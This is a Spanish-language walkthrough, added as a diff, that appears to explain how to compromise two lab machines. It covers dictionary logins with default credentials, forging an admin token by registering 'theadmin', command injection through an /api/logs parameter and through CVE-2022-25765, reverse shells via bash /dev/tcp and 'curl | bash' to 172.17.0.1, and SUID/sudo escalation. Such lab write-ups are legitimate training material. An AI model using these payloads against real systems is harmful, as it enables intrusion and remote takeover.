@@ -1,0 +1,81 @@
+1. Vulnerabilidad en el login: 
+
+	El administrador a añadido a la base de datos usuarios por defecto que fácilmente se pueden encontrar en un diccionario.
+	En concreto se ha utilizado las credenciales de las listas “mysql-betterdefaultpasslist.txt” y “postgres-betterdefaultpasslist.txt” de “Seclist”
+	en la ubicación “SecLists/Passwords/Default-Credentials”. También se puede encontrar en el proyecto en “assets/listas/usuarioyPass.txt”. 
+
+	Con un simple ataque de diccionario con alguna herramienta como “Burpsuite” y estas listas se consigue acceder fácilmente.
+
+
+2. Vulnerabilidad de ejecución de comandos: 
+
+	Podemos ver que hay un link en la página principal, podemos ver cómo estamos usando virtual hosting.
+	Añadiendo ese dominio al /etc/hosts accedemos a una nueva página. Esta nueva página nos muestra cómo crear 
+	usuarios y logarnos con ellos. También podemos descargar el código. Investigando el código vemos como hay
+	hay una página que nos permite ejecutar comandos en la maquina "/api/logs", pero tenemos que utilizar un token con el usuario
+	"theadmin". Vemos que lo único que comprueba es el nombre. Intentamos crear un usuario con ese nombre:
+
+	curl -s -X POST "http://secret.ibc/api/user/register" -H "Content-Type:application/json" -d '{"name":"theadmin","email":"admin@admin.com","password":"admin123"}'; echo
+
+	Efectivamente podemos crear ese usuario ya que no está creado. Nos llegamos con ese usuario para obtener el token:
+
+	curl -s -X POST "http://secret.ibc/api/user/login" -H "Content-Type:application/json" -d '{"email":"admin@admin.com","password":"admin123"}'; echo
+
+	Obtendremos el token, ahora intentamos hacer una acción con ese token:
+
+	curl -s -X GET "http://secret.ibc/api/priv" -H "auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2NTgyZGU1NmI5Y2MyMzAwZWIzNGJjZmYiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImFkbWluQGFkbWluLmNvbSIsImlhdCI6MTcwMzA3NTQzOH0.JvVn2lcz7Ab2tLo10Z__rMRdpWNhFwVUFs5Ewa7f76M"
+
+	Hemos conseguido acceder como administradores. Ahora Hacemos una petición a /api/logs para intentar ejecutar comandos:
+
+	curl -s -X GET -G "http://secret.ibc/api/logs" -H "auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2NTgyZGU1NmI5Y2MyMzAwZWIzNGJjZmYiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImFkbWluQGFkbWluLmNvbSIsImlhdCI6MTcwMzA3NTQzOH0.JvVn2lcz7Ab2tLo10Z__rMRdpWNhFwVUFs5Ewa7f76M" --data-urlencode "file=/etc/passwd;whoami" | jq
+
+	Como vemos hemos obtenido la respuesta de la maquina remota con un nombre de usuario. Ahora podemos intentar conseguir una shell reversa.
+	Por ejemplo, podemos crear un archivo index.html con el siguiente contenido:
+
+	#!/bin/bash
+	bash -i >& /dev/tcp/172.17.0.1/4444 0>&1
+
+	Ahora ejecutamos un servidor web en esa ubicación "python3 -m http.server 8080", abrimo una terminal de nc en escucha "nc -lvp 4444"
+	y por último intentamos obtener el script con curl y ejecutarlo en la maquina remota:
+
+	curl -s -X GET -G "http://secret.ibc/api/logs" -H "auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2NTgyZGU1NmI5Y2MyMzAwZWIzNGJjZmYiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImFkbWluQGFkbWluLmNvbSIsImlhdCI6MTcwMzA3NTQzOH0.JvVn2lcz7Ab2tLo10Z__rMRdpWNhFwVUFs5Ewa7f76M" --data-urlencode "file=/etc/passwd;curl 172.17.0.1:8080 | bash" | jq
+
+	En la terminal de nc podemos ver como hemos conseguido acceso a la máquina.
+
+3. Vulnerabilidad para la elevación: 
+
+	Ejecutando el comando “sudo -l” Nos aparecerá un archivo con permisos de sudo “ALL ALL=(ALL) NOPASSWD: #archivo#” siendo “#archivo#”
+	el archivo con permisos de sudo.
+
+	El archivo será uno recogido en la lista de “GTFOBins” (https://gtfobins.github.io/) en esa página se detalla como explotar la vulnerabilidad para cada caso.
+1. Vulnerabilidad en el login: 
+
+	El administrador a añadido a la base de datos usuarios por defecto que fácilmente se pueden encontrar en un diccionario.
+	En concreto se ha utilizado las credenciales de las listas “mysql-betterdefaultpasslist.txt” y “postgres-betterdefaultpasslist.txt” de “Seclist”
+	en la ubicación “SecLists/Passwords/Default-Credentials”. También se puede encontrar en el proyecto en “assets/listas/usuarioyPass.txt”. 
+
+	Con un simple ataque de diccionario con alguna herramienta como “Burpsuite” y estas listas se consigue acceder fácilmente.
+
+
+2. Vulnerabilidad de ejecución de comandos: 
+
+	Se puede apreciar un formulario donde si añadimos una URL valida nos genera un pdf con el contenido de dicha web,
+	Ponemos una URL válida para examinar el pdf. Una vez descargado lo examinamos con alguna herramienta como exiftool,
+	vemos que este pdf ha sido creado por una herramienta determinada y vemos su versión. Si buscamos esa versión en 
+	internet vemos que contiene una vulnerabilidad de ejecución de comandos. En concreto CVE-2022-25765.
+
+	Para explotarla simplemente tenemos que poner una url valida seguido de "?name=%20``" e introducir el comando entre los acentos.
+	Vamos a probar con un sleep si se ejecutan.
+
+	http://172.17.0.1/?name=%20`sleep 10`
+
+	Vemos como la página se demora 10 segundos en responder. Finalmente podemos ejecutar una shell reversa:
+
+	http://172.17.0.1/?name=%20`bash -c "bash -i >& /dev/tcp/172.17.0.1/4444 0>&1"`
+
+3. Vulnerabilidad para la elevación: 
+
+	Ejecutando el comando “find / -perm /6000 2>/dev/null” nos aparecerá una lista de los archivos que tienen la caracterisitica SUID.
+	Uno de estos será vulnerable, habrá que buscar cual está en la lista de “GTFOBins” (https://gtfobins.github.io/).
+
+	Para explotarlo habrá que seguir los datos de la página de “GTFOBins” para cada caso.
